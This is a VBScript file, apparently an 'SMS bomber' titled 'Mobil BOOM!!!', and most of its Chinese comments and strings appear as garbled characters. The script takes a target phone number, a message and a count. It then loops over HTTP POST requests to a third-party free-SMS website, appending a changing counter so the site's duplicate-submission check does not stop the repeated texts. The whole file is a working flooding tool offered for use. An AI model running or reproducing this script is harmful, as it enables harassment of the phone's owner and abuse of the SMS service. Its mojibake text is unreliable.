'����:Lilo(Сƭ��) / ��ɫ�켣
'VBS+XMLHTTP ������Ѷ������� ���ֻ�����

iEnter= Chr(13) & Chr(10)
Usage = "CScript iSMS.vbs �ֻ����� �������� �����Ա� ���ʹ��� �������� [�ۼ�����]" & iEnter & iEnter & "ע��: �Ա���1��ʾ����,2��ʾ'Ůʿ',����������������������пո��Ϊ��ʱ,��ʹ�����Ž��ò�����ס�����ڸ���վ�������ύ�ظ�����,������ѭ���вμ����ۼ�����,�ò�������ֵ�Ϳ�ѡ�" & iEnter & iEnter & "CScript iSMS.vbs -h �����÷�ʵ����"

Function URLEncoding(vstrIn)
	strReturn = ""
	For i = 1 To Len(vstrIn)
		ThisChr = Mid(vStrIn,i,1)
		If Abs(Asc(ThisChr)) < &HFF Then
			strReturn = strReturn & ThisChr
		Else
			innerCode = Asc(ThisChr)
			If innerCode < 0 Then
				innerCode = innerCode + &H10000
			End If
			Hight8 = (innerCode And &HFF00)\ &HFF
			Low8 = innerCode And &HFF
			strReturn = strReturn & "%" & Hex(Hight8) & "%" & Hex(Low8)
		End If
	Next
	URLEncoding = strReturn
End Function

Function bytes2BSTR(vIn)
	strReturn = ""
	For i = 1 To LenB(vIn)
		ThisCharCode = AscB(MidB(vIn,i,1))
		If ThisCharCode < &H80 Then
			strReturn = strReturn & Chr(ThisCharCode)
		Else
			NextCharCode = AscB(MidB(vIn,i+1,1))
			strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))
			i = i + 1
		End If
	Next
	bytes2BSTR = strReturn
End Function

Function xmlPost(iPost,iUrl)
	iPost=URLEncoding(iPost)
	Set xPost = CreateObject("Microsoft.XMLHTTP")
	xPost.open "POST",iUrl,false
		xPost.setRequestHeader "Content-Length",Len(iPost)
		xPost.setRequestHeader "CONTENT-TYPE","application/x-www-form-urlencoded"
	xPost.send(iPost)
	xmlPost=bytes2BSTR(xPost.responseBody)
End Function

Function xmlHead(iUrl)
	iPost=URLEncoding(iPost)
	Set xPost = CreateObject("Microsoft.XMLHTTP")
	xPost.open "POST",iUrl,false
	xPost.send(iPost)
	'xmlHead=bytes2BSTR(xPost.responseBody)
End Function

Function GetBt(vString,iString,dString)
	iNum = inStr(Getinfo,iString)
	dNum = inStr(Getinfo,dString)
	iLen = Len(iString) + iNum
	GetBt= Mid(Getinfo,iLen,dNum-iLen)
End Function

Sub IsWrong()
	If IsNumeric(mobil)=False Then WScript.Echo "����:�ֻ�����ӦΪ�����֡�" : WScript.Quit
	If Len(mobil) <> 11 Then Wscript.Echo "����:�ֻ�����Ϊ11λ���֡�" : WScript.Quit
	If IsNumeric(cf)=False Then WScript.Echo "����:�Ա����,1��������,2����Ůʿ��" : WScript.Quit
	If cf<>1 And cf<>2 Then WScript.Echo "����:�Ա����,1��������,2����Ůʿ��" : WScript.Quit
	If message = "" Then WScript.Echo "����:�������ݲ���Ϊ�ա�" :WScript.Quit
	If IsNumeric(vlTitle)=False Then WScript.Echo "����:���ʹ���ӦΪ�����֡�":WScript.Quit
	If IsNumeric(iStart)=False Then WScript.Echo "����:���ʹ�������ӦΪ�����֡�":WScript.Quit
End Sub

If (LCase(Right(WScript.Fullname,11))="wscript.exe") Then
	Msgbox "VBS+XMLHTTP ������Ѷ������ط��ֻ�����" & iEnter & iEnter & "����:Lilo(Сƭ��) - [��ɫ�켣]" &iEnter &iEnter &Usage, 4096 , "Lilo/�Ƶ�����       Mobil BOOM!!!"
	WScript.Quit
End If

If WScript.Arguments(0)="-h" Then WScript.Echo iEnter & iEnter & "����:" & iEnter & iEnter & "CScript iSMS.vbs 01234567891 Lilo 1 100 hello 120" :WScript.Quit

If WScript.Arguments.Count < 5 Then
	WScript.Echo iEnter &Chr(7)& "����:����������" & iEnter & iEnter & "ʹ�÷���:" &iEnter &iEnter & Usage
	WScript.Quit
End If

mobil  = WScript.Arguments(0)
mname  = WScript.Arguments(1)
cf     = WScript.Arguments(2)
vlTitle= WScript.Arguments(3)
message= WScript.Arguments(4)
xcni   = "xcni"

If WScript.Arguments.Count=6 Then iStart = WScript.Arguments(5) Else iStart = 0
Call IsWrong()

WScript.Echo iEnter
For iSendNumeric=1 To Abs(vlTitle)
	Postr  = "mobil=" & mobil & "&name=" & mname & ":" & (iSendNumeric+iStart) & "&cf=" & cf & "&message=" & message & (iSendNumeric+iStart) & "&xcni=" & xcni
	Getinfo = xmlPost(Postr,"http://sms.bkwww.com/success.asp")
	ReturnInfo = GetBt(Getinfo,"javascript>alert('","');location")
	If inStr(ReturnInfo,"���ŷ��ͳɹ�") Then ReturnInfo = Left (ReturnInfo,6) & "! ��" & iSendNumeric & "��."
	If inStr(ReturnInfo,"�벻Ҫ�����ύ") Then ReturnInfo = "����ʧ��!  ��" & iSendNumeric & "��."
	WScript.Echo ReturnInfo
	xmlHead("http://sms.bkwww.com/index.asp")
	If iSendNumeric >= vlTitle+iStart Then Exit For
Next